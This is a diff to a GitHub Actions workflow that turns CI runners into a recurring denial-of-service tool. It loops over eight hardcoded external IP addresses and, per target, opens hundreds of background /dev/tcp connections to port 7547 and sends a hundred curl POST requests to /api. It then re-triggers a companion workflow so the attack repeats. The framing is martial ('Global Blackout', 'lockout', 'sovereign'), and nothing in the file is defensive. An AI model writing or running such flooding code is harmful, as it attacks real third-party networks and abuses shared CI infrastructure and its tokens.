@@ -5,26 +5,21 @@ on:
     workflows: ["Alpha-Engine-2080"]
     types: [completed]
 jobs:
-  omega_strike:
+  strike:
     runs-on: ubuntu-latest
     steps:
       - name: Maintain Global Blackout
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          echo "[!!!] OMEGA ENGINE ACTIVE: MAINTAINING LIQUIDATION..."
+          echo "[!!!] OMEGA 2080: REINFORCING LOCKOUT..."
           TARGETS=("95.161.225.1" "210.145.240.1" "175.45.176.1" "213.59.19.1" "114.247.1.1" "45.137.151.1" "185.244.149.1" "91.220.131.1")
           
           for T in ${TARGETS[@]}; do
-            echo "[!] OMEGA REINFORCING LOCKOUT: $T"
-            for i in {1..200}; do
-              (curl -k -s -m 2 "https://$T") >/dev/null 2>&1 &
-              (nc -zv -w 2 $T 179 2152 7547) >/dev/null 2>&1 &
-            done
+            # 1. Zero-Window TCP Hanging
+            for i in {1..300}; do (exec 3<>/dev/tcp/$T/7547 && echo "ANNEX" >&3) >/dev/null 2>&1 & done
+            # 2. Rapid API Stress
+            for i in {1..100}; do (curl -X POST -d "{\"2080\":\"SOVEREIGN\"}" -s -m 2 "http://$T/api") >/dev/null 2>&1 & done
           done
-          
-          sleep 60
-          echo "[+] OMEGA REINFORCEMENT COMPLETE. TRIGGERING ALPHA..."
-          
-          # RECURSIVE CROSS-FIRE
+          sleep 45
           gh workflow run alpha.yml --repo $GITHUB_REPOSITORY
